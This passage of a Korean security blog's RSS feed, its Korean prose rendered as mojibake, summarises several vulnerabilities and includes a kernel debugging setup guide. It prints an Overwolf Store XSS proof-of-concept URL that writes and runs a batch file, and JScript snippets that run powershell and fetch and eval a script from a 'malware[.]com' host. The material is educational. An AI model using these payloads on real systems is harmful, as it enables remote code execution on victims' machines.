onerror&#x3D;alert(document.location)&gt;&#x2F;4</code></pre><p><code>overwolfstore://</code> Custum Schemeë¥¼ ì‚¬ìš©í•˜ë©´ ì›¹ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ OverwolfAppstore.exe í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. URLì˜ categoryì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì´ ì˜¤ë¥˜ ë©”ì„¸ì§€ì˜ ì¼ë¶€ë¡œ responce bodyì— reflect ë˜ë©° Overwolf Store UIì˜ DOMì— reflect ë˜ë¯€ë¡œ XSS ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img+src&#x3D;x+onerror&#x3D;%22overwolf.io.writeFileContents(&#39;C:\\windows\\temp\\d.bat&#39;,&#39;start%20cmd%20%252fk%20whoami&#39;,&#39;&#39;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&#39;C:\\windows\\temp\\d.bat&#39;)%22&gt;&#x2F;CCCCCC</code></pre><p>ìœ„ëŠ” PoC ì½”ë“œë¡œ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ í•©ë‹ˆë‹¤.</p><ol><li>ëˆ„êµ°ê°€ ì•…ì„± URLì— ì ‘ì†í•˜ë©´ Overwolf Store ì‘ìš©í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ê³  XSS ì·¨ì•½ì  íŠ¸ë¦¬ê±°.</li><li><code>C:\windows\temp\</code> í´ë”ì— ì•…ì„± batch íŒŒì¼ ìƒì„±.</li><li>batch íŒŒì¼ ì‹¤í–‰</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
      
      <category domain="https://hackyboiz.github.io/tags/sandbox-escape/">sandbox escape</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/02/fabu1ous/2021-06-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-28476: Microsoft Hyper-Vì˜ Guest-to-Host RCE ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/06/01/l0ch/2021-06-01/</link>
      <guid>https://hackyboiz.github.io/2021/06/01/l0ch/2021-06-01/</guid>
      <pubDate>Tue, 01 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0vercl0k/CVE-2021-28476&quot;&gt;CVE-2021-2847</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-28476">CVE-2021-28476: a guest-to-host â€œMicrosoft Hyper-V Remote Code Execution Vulnerabilityâ€ in vmswitch.sys.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Hyper-V</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftì˜ í•˜ì´í¼ë°”ì´ì € ê¸°ë°˜ ê°€ìƒí™” ì‹œìŠ¤í…œì¸ Hyper-Vì—ì„œ ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì´ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ìœ¼ë¡œ escape í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì˜ <code>vmswitch.sys</code> ë“œë¼ì´ë²„ì— ì¡´ì¬í•©ë‹ˆë‹¤. <code>vmswitch.sys</code>ëŠ” ê°€ìƒ íŒŒí‹°ì…˜ì´ ì¡´ì¬í•˜ëŠ” ì‹œìŠ¤í…œì—ì„œ íŒŒí‹°ì…˜ ê°„ í†µì‹ ì— ì‚¬ìš©ë˜ëŠ” ì±„ë„ ê¸°ë°˜ í†µì‹  ë©”ì»¤ë‹ˆì¦˜ì¸ <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-architecture">VMBus</a> ê¸°ëŠ¥ì„ ì§€ì›í•©ë‹ˆë‹¤. <code>vmswitch.sys</code>ì˜ <code>VmsIfrInfoParams_OID_SWITCH_NIC_REQUEST</code> í•¨ìˆ˜ì—ì„œëŠ” ì›ê²© <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/network/remote-ndis--rndis-2">NDIS(RNDIS)</a>  ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ”ë°, ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì—ì„œ ì•…ì„± RNDIS ìš”ì²­ì„ ë³´ë‚´ í•´ì»¤ê°€ ì œì–´í•˜ëŠ” ë°ì´í„°ë¡œ í˜¸ì¶œì´ ê°€ëŠ¥í•˜ê³  ì´ë¥¼ ì´ìš©í•´ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì´ ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì˜ í¬ì¸í„°ë¥¼ ì—­ì°¸ì¡° í•˜ë„ë¡ í•©ë‹ˆë‹¤.</p><p>í•´ì»¤ëŠ” Hyper-Vì— Ubuntu focal ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì„ ìƒì„±í•œ ë’¤ í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/hyper-v/">hyper-v</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/01/l0ch/2021-06-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] COM ê°ì²´ë¥¼ í™œìš©í•œ ë°±ë„ì–´</title>
      <link>https://hackyboiz.github.io/2021/05/31/idioth/2021-05-31/</link>
      <guid>https://hackyboiz.github.io/2021/05/31/idioth/2021-05-31/</guid>
      <pubDate>Mon, 31 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/maltrak/com-objects-p-1-the-hidden-bac</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/maltrak/com-objects-p-1-the-hidden-backdoor-in-your-system-947ac4285e85">COM Objects P.1: The Hidden Backdoor in Your System</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì§€ë‚œ ëª‡ ë…„ê°„, í•´ì»¤ë“¤ì€ COM Objectì„ í†µí•´ fileless attack, defense ìš°íšŒ, í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ë¥¼ ìš°íšŒí•˜ê³  RPC í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ë‚´ë¶€ì— ì¹¨íˆ¬í•˜ê¸°ë„ í–ˆìŠµë‹ˆë‹¤. í•´ì»¤ë“¤ì´ COM ê°ì²´ë¥¼ í†µí•´ ê³µê²©ì„ ì§„í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>ë¨¼ì € Initial Accessë¥¼ ìœ„í•œ COM ê°ì²´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ì„œ í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. COM Scriptletì„ í†µí•´ ì•…ì„± ìë°”ìŠ¤í¬ë¦½íŠ¸ë‚˜ VBScriptë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>COMì„ í™œìš©í•˜ì—¬ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ëŠ” Scriptlet ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±ë©ë‹ˆë‹¤. ì²«ë²ˆì§¸ë¡œ Shellì— ì ‘ê·¼í•©ë‹ˆë‹¤.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>&lt;![CDATA[<span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><code>ActiveXObject</code>ë¥¼ í†µí•´ <code>WScript.Shell</code>ì„ í˜¸ì¶œí•˜ì—¬ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  ê·¸ ë‹¤ìŒ ë„¤íŠ¸ì›Œí¬ í†µì‹ ì„ í†µí•´ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span class="hljs-literal">false</span>);net.Send();js = net.ResponseText;<span class="hljs-built_in">eval</span>(js);</code></pre><p>.NETì˜ Serializationì„ í™œìš©í•˜ì—¬ ìœ„ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>ë¥¼ <code>ActiveXObject</code>ë¡œ í˜¸ì¶œí•˜ë©´ ê°ì²´ë¥¼ base64ë¡œ ì¸ì½”ë”©í•  ìˆ˜ ìˆê³  ë©”ëª¨ë¦¬ì—ì„œ ë””ì½”ë”©ë˜ì–´ ë©”ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>ë¥¼ í†µí•´ ì‰½ê²Œ í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/backdoor/">backdoor</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/com/">com</category>
      
      <category domain="https://hackyboiz.github.io/tags/vbscript/">vbscript</category>
      
      <category domain="https://hackyboiz.github.io/tags/jscript/">jscript</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/31/idioth/2021-05-31/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ê³µëŒ€ì˜¤ë¹ ê°€ ì•Œë ¤ì£¼ëŠ” Windows Driver Part 1 - Setting Up Kernel Debugging</title>
      <link>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/</link>
      <guid>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/</guid>
      <pubDate>Sun, 30 May 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;ì„œë¡ &quot;&gt;&lt;a href=&quot;#ì„œë¡ &quot; class=&quot;headerlink&quot; title=&quot;ì„œë¡ &quot;&gt;&lt;/a&gt;ì„œë¡ &lt;/h1&gt;&lt;p&gt;ì•ˆë…•í•˜ì„¸ìš”! L0chì…ë‹ˆë‹¤. ì§€ë‚œë²ˆ pwn cool sexy ì‹œë¦¬ì¦ˆì— ì´ì–´ ìƒˆë¡œìš´ ì‹œë¦¬ì¦ˆë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤!  ê·¸ ì‚¬ì´ì— ê¸°ë§ê³ ì‚¬</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h1><p>ì•ˆë…•í•˜ì„¸ìš”! L0chì…ë‹ˆë‹¤. ì§€ë‚œë²ˆ pwn cool sexy ì‹œë¦¬ì¦ˆì— ì´ì–´ ìƒˆë¡œìš´ ì‹œë¦¬ì¦ˆë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤!  ê·¸ ì‚¬ì´ì— ê¸°ë§ê³ ì‚¬ ê¸°ê°„ì´ ëœ ê±´ ë¤.. </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%201.png" alt="windows-driver/Untitled%201.png"></p><blockquote><p>ê³¼ê±°ì˜ ë‚˜ì•¼.. ë„ˆ ê¸°ë§ë„ ë§í–ˆì–´</p></blockquote><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%202.png" alt="windows-driver/Untitled%202.png"></p><p>êµìˆ˜ë‹˜ ì¢…ê°•ì¢€ìš”ã… ã… ã… </p><p>ì´ë²ˆ ì‹œë¦¬ì¦ˆì—ì„œëŠ” í•˜ë£¨í•œì¤„ì„ ë³´ë‹¤ ë³´ë©´ ê½¤ ìì£¼ ë‚˜ì˜¤ëŠ” Windows third-party driverì˜ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì ì„ ë‹¤ë£° ì˜ˆì •ì…ë‹ˆë‹¤! </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%203.png" alt="windows-driver/Untitled%203.png"></p><blockquote><p>ì´ ë“œë¼ì´ë²„ ì•„ë‹˜ã…ã…;</p></blockquote><p>ì˜ˆì‹œë¥¼ í•˜ë‚˜ ë“¤ì–´ë³´ìë©´.. ìµœê·¼ ì´ìŠˆê°€ ëœ Dellì˜ BIOS ì—…ë°ì´íŠ¸ì— ì‚¬ìš©ë˜ëŠ” ë“œë¼ì´ë²„ì—ì„œ ë‚˜ì˜¨ <a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[í•˜ë£¨í•œì¤„] CVE-2021-21551: ìˆ˜ì–µ ëŒ€ì˜ Dell PCì— ì˜í–¥ì„ ì£¼ëŠ” ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì  </a> ì •ë„ê°€ ìˆê² ë„¤ìš”. ëŒ€ì¶© ì‹¬ê°í•œ ì·¨ì•½ì ì¸ê±´ ì•Œê² ëŠ”ë° IOCTLì€ ë­ê³ â€¦ <code>EPROCESS</code>? í† í°ì„ ì–´ë–»ê²Œ ë®ì–´ ì“´ë‹¤ëŠ” ê±´ì§€ ë˜ ê¶Œí•œìƒìŠ¹ì€ ì–´ë–»ê²Œ í•œë‹¤ëŠ” ê±´ì§€.. ì •ë§ ëª¨ë¥´ëŠ” ìš©ì–´, ê°œë… íˆ¬ì„±ì´ë„¤ìš”. ê³µë¶€í• ê²Œ ë„ˆë¬´ ë§ì§€ë§Œ ã… ã… ã…  í•˜ë‚˜ì”© ê³µë¶€í•˜ë‹¤ë³´ë©´ ì–¸ì  ê°€ëŠ” ë“œë¼ì´ë²„ ì·¨ì•½ì ì„ ì°¾ì„ìˆ˜ë„ ìˆê² ì£ ?</p><p>ì˜¤ëŠ˜ì€ ì‹œë¦¬ì¦ˆ ì²« ê¸€ì´ë‹ˆ ê°€ë³ê²Œ ë””ë²„ê¹… í™˜ê²½ ì„¸íŒ…ìœ¼ë¡œ ì‹œì‘í•´ì„œ ì•ìœ¼ë¡œ ê°„ë‹¨í•œ exploit ì˜ˆì œë¥¼ ë‹¤ë£¨ê³ , one-day ë¶„ì„í•˜ëŠ” ê²ƒì„ ëìœ¼ë¡œ ë§ˆë¬´ë¦¬í•˜ë ¤ê³  í•©ë‹ˆë‹¤. ì´ë²ˆ ì‹œë¦¬ì¦ˆë„ ê¸¸ì–´ì§ˆ ê²ƒ ê°™ì€ ì˜ˆê°ì´ ë“œëŠ” ê±´.. ê¸°ë¶„ íƒ“ì¸ê°€..?</p><h1 id="ì¤€ë¹„"><a href="#ì¤€ë¹„" class="headerlink" title="ì¤€ë¹„"></a>ì¤€ë¹„</h1><p>ìš°ì„  ë””ë²„ê¹… ì„¸íŒ…ë¶€í„° í•´ì•¼ í•©ë‹ˆë‹¤. ì»¤ë„ ë””ë²„ê¹…ì€ ìœ ì € ëª¨ë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ë‹¬ë¦¬ ë¡œì»¬ì—ì„œ ë””ë²„ê¹…í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ì™„ì „íˆ ë¶ˆê°€ëŠ¥í•œ ê²ƒì€ ì•„ë‹ˆì§€ë§Œ ì œì•½ì‚¬í•­ì´ ë§ì£ . ê·¸ë˜ì„œ! ë³´í†µì€ ì›ê²©ì§€ PCë¥¼ í•˜ë‚˜ êµ¬ì„±í•´ ë””ë²„ê±°ë¥¼ ì„¸íŒ…í•©ë‹ˆë‹¤.</p><p>ì´ì „ì—ëŠ” named pipeë¥¼ ì‚¬ìš©í•´ ê°€ìƒ ì‹œë¦¬ì–¼ í¬íŠ¸ë¡œ ì»¤ë„ ë””ë²„ê¹…ì„ í–ˆì§€ë§Œ ì‹œë¦¬ì–¼ í¬íŠ¸ ì†ë„ì˜ í•œê³„ë¡œ KDNET ë„¤íŠ¸ì›Œí¬ ë””ë²„ê¹…ì„ ì‚¬ìš©í•˜ë©° í•„ìš”í•œ ì¤€ë¹„ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><p><strong>1. í˜¸ìŠ¤íŠ¸ Windowsì™€ VMware or Hyper-Vì˜ ê²ŒìŠ¤íŠ¸ Windows</strong></p><p>Windbgë¥¼ ì‚¬ìš©í•´ ì»¤ë„ì„ ë¶„ì„í•  ê²ƒì´ê¸° ë•Œë¬¸ì— ë¶„ì„ëŒ€ìƒì´ ë˜ëŠ” ë””ë²„ê¸° Windowsì™€ ë¶„ì„ì„ ì§„í–‰í•  Windowsê°€ ê°ê° í•„ìš”í•©ë‹ˆë‹¤. í˜¸ìŠ¤íŠ¸ê°€ Windows í™˜ê²½ì´ë©´ ê²ŒìŠ¤íŠ¸ Windows VM í•˜ë‚˜ë§Œ ì˜¬ë¦¬ë©´ ë©ë‹ˆë‹¤. </p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip.png" alt="windows-driver/tempsnip.png"></p><blockquote><p>?</p></blockquote><p>ë„¤ ì €ëŠ” ë§¥ì„ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì—â€¦..  Windows VM ë‘ê°œë¥¼ ì˜¬ë ¤ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤. </p><p>ë„¤? ì–´ë””ì„œ ë­ê°€ ëŒì•„ê°€ëŠ” ì†Œë¦¬ ì•ˆë‚˜ëƒêµ¬ìš”?</p><p>.</p><p>.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%204.png" alt="windows-driver/Untitled%204.png"></p><blockquote><p>ì´ë¥™í•œë“œì•„ì•„ã…ã… !!!</p></blockquote><p>ë§¥ì´ ì˜ ë²„í…¨ì£¼ê³  ìˆìœ¼ë‹ˆ ë‹¤í–‰ì´ë„¤ìš” ã…ã… ì•„ë‹˜ë§ê³ <br>ê¸€ì—ì„œëŠ” í¸ì˜ìƒ í˜¸ìŠ¤íŠ¸ OSê°€ Windowsë¼ê³  ê°€ì •í•˜ê³  ë¶„ì„í•  ë””ë²„ê¸° Windowsë¥¼ ê²ŒìŠ¤íŠ¸ë¼ê³  ë¶€ë¥´ê² ìŠµë‹ˆë‹¤! </p><p><strong>2. ë¸”ë£¨ìŠ¤í¬ë¦°ì„ ì¹œêµ¬ì²˜ëŸ¼ ìƒê°í•˜ëŠ” ê°•ì¸í•œ ë©˜íƒˆ(?)</strong></p><p>ì‚¬ì‹¤ ì·¨ì•½ì  ì°¾ëŠ” ì…ì¥ì—ì„œ ë¸”ë£¨ìŠ¤í¬ë¦°ì€ ê³§ í¬ë˜ì‹œê¸° ë•Œë¬¸ì— ë¸”ë£¨ìŠ¤í¬ë¦°ì„ ë³¸ë‹¤ë©´ ê°œì´ë“ì´ì£ ã…‹ã…‹  </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%205.png" alt="windows-driver/Untitled%205.png"></p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%206.png" alt="windows-driver/Untitled%206.png"></p><blockquote><p>í¸ì•ˆ-</p></blockquote><p>ë©˜íƒˆê¹Œì§€ ì¤€ë¹„ê°€ ëª¨ë‘ ë˜ì—ˆë‹¤? ë°”ë¡œ ë””ë²„ê¹… ì„¸íŒ…ìœ¼ë¡œ ê³ ê³ ê³ </p><h1 id="Setting-Up-Debugging"><a href="#Setting-Up-Debugging" class="headerlink" title="Setting Up Debugging"></a>Setting Up Debugging</h1><p>ë¨¼ì € ê²ŒìŠ¤íŠ¸ì™€ í˜¸ìŠ¤íŠ¸ Windowsì— <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/debugger/debugger-download-tools">Windbg</a>ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤. í˜¸ìŠ¤íŠ¸ Windowsì—ëŠ” Windbg Previewë¥¼ ì„¤ì¹˜í•´ ì‚¬ìš©í•´ë„ ë˜ì§€ë§Œ Windbg PreviewëŠ” kdnetì´ ì—†ê¸° ë•Œë¬¸ì— ê²ŒìŠ¤íŠ¸ Windowsì—ëŠ” Windbgë¥¼ SDKë¡œ ì„¤ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤!</p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip%201.png" alt="windows-driver/tempsnip%201.png"></p><p>Windbg ì„¤ì¹˜ë¥¼ ëëƒˆìœ¼ë©´ ê²ŒìŠ¤íŠ¸ VM ì„¤ì •â†’Network Adapterì—ì„œ Network connectionì„ Bridgedë¡œ ì„¤ì •í•´ í˜¸ìŠ¤íŠ¸ì™€ í†µì‹ í•  ìˆ˜ ìˆê²Œ ì„¤ì •í•œ ë’¤ í†µì‹ ì´ ì˜ ë˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸ë¥¼ í•´ë´…ë‹ˆë‹¤.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%207.png" alt="windows-driver/Untitled%207.png"></p><p>í•‘ í…ŒìŠ¤íŠ¸ í•  ë•ŒëŠ” í˜¸ìŠ¤íŠ¸ì™€ ê²ŒìŠ¤íŠ¸ ëª¨ë‘ ë°©í™”ë²½ì—ì„œ ICMP ì¸ë°”ìš´ë“œ í—ˆìš©í•˜ëŠ” ê²ƒ ìŠì§€ ë§ˆì„¸ìš”!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%208.png" alt="windows-driver/Untitled%208.png"></p><p>ì •ìƒì ìœ¼ë¡œ í†µì‹ ì´ ë˜ëŠ” ê±¸ í™•ì¸í–ˆìœ¼ë©´ í˜¸ìŠ¤íŠ¸ì˜ host nameì„ í™•ì¸í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%209.png" alt="windows-driver/Untitled%209.png"></p><p>ê²ŒìŠ¤íŠ¸ì—ì„œ cmdë¥¼ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•´ ë‹¤ìŒê³¼ ê°™ì´ <code>kdnet.exe</code>ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ë•Œ í¬íŠ¸ëŠ” 50000 ~ 50039 ë²”ìœ„ ì•ˆì—ì„œ ì¤ë‹ˆë‹¤.</p><pre><code class="hljs angelscript">&gt; kdnet.exe &lt;host name&gt; <span class="hljs-number">50001</span></code></pre><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2010.png" alt="windows-driver/Untitled%2010.png"></p><p>í•´ë‹¹ ë¨¸ì‹ ì„ ë””ë²„ê¹…í•˜ê¸° ìœ„í•´ ì»¤ë§¨ë“œë¥¼ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì—ì„œ ì‹¤í–‰í•˜ë¼ê³  í•˜ë„¤ìš”! ë¹¨ê°„ ë°•ìŠ¤ì˜ ì»¤ë§¨ë“œë¥¼ ë³µì‚¬í•´ë†“ìŠµë‹ˆë‹¤.</p><p>ì´ì œ í˜¸ìŠ¤íŠ¸ì˜ Windbg Previewë¥¼ ì‹¤í–‰í•˜ê³  Start debugging â†’ Attach to Kernel â†’ Net ì—ì„œ í¬íŠ¸ì™€ ì»¤ë§¨ë“œë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2011.png" alt="windows-driver/Untitled%2011.png"></p><p>OKë¥¼ ëˆŒëŸ¬ Windbg Previewê°€ ëŒ€ê¸° ìƒíƒœê°€ ë˜ë©´ ê²ŒìŠ¤íŠ¸ë¥¼ <code>shutdown -r -t 0</code> ìœ¼ë¡œ ì¬ë¶€íŒ…í•´ì¤ë‹ˆë‹¤. </p><p>ì¬ë¶€íŒ…í•˜ë©´..!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2012.png" alt="windows-driver/Untitled%2012.png"></p><p>ì˜ ë¶™ì€ ê²ƒ ê°™ì£ ? ë””ë²„ê¸° ë¨¸ì‹ ì¸ ê²ŒìŠ¤íŠ¸ Windowsë„ í™•ì¸í•´ë³¼ê²Œìš”.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2013.png" alt="windows-driver/Untitled%2013.png"></p><p>ë””ë²„ê±°ê°€ ë¶™ì€ ìƒíƒœì—ì„œ ë¶€íŒ…ë˜ë©´ ìš°ì¸¡ í•˜ë‹¨ì— í…ŒìŠ¤íŠ¸ ëª¨ë“œì™€ ë¹Œë“œ ë²„ì „ ì •ë³´ê°€ í‘œì‹œë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ë‹¤ìŒ íŒŒíŠ¸ë¶€í„°ëŠ” ë³¸ê²©ì ìœ¼ë¡œ Windowsì˜ third-party driverì™€ ì·¨ì•½ì , one-day ë¶„ì„ê¹Œì§€ ì•Œì•„ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤ ã…ã…</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-driver/">windows driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/debugging/">debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel-debugging/">kernel debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/third-party-driver-exploitation/">third-party driver exploitation</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
      <link>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/</link>
      <guid>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/</guid>
      <pubDate>Sun, 30 May 2021 05:00:00 GMT</pubDate>
      
        
        
